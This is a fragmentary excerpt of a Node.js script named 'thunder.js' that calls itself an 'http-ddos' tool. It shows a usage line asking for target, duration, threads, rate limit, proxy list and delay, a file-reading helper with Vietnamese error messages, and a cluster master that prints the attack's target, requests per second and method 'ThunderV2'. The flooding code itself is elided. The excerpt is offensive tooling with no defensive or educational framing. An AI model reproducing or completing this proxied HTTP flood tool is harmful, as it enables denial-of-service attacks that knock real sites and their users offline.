...
if (process.argv.length < 8) {
    console.log(`Version: 2.0 fix signature http-ddos 2%\nExample: node thunder.js <target> <time> <thread> <ratelimit> <proxy> <delay(1-20)>`);
    process.exit();
}
 ...
 function readLines(filePath) {
    if (!filePath) {
        console.log("Không có tập tin bạn đã nhập");
        return;
    }
    try {
        ...
        console.error(`Lỗi đọc tập tin: ${error.message}`);
    }
}
...
if (cluster.isMaster){
  console.clear();
  console.log(`> Target: ${process.argv[2]}\n> Time: ${process.argv[3]}\n> Threads: ${process.argv[4]}x\n> Rps: ${process.argv[5]}\n> Proxy: ${process.argv[6]} (${lengpx.length})\n> Method: ThunderV2\n> Started: ${started()}`);
